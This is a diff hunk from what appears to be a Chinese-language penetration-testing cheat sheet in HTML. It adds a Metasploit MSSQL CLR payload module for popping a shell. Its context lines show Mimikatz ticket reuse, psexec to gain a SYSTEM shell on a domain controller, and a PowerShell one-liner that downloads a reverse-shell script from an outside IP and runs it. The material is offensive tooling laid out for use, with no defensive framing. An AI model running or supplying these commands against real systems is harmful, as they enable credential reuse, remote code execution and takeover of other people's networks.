@@ -208,6 +208,9 @@ kerberos::ptc 凭证地址
 psesec.exe -accepteula \\dc.abc.com -s cmd.exe
 可以配合psexec -s 得到一个System shell
 </code></pre>
+<p>mssql弹shell</p>
+<pre><code>exploit/windows/mssql/mssql_clr_payload
+</code></pre>
 <h1 id="下载文件">下载文件</h1>
 <pre><code>powershell &quot;iex(New-Object Net.WebClient).DownloadString('http://192.168.159.10/Invoke-PowerShellTcpOneLine_443.ps1')&quot;
 #下载文件并且执行
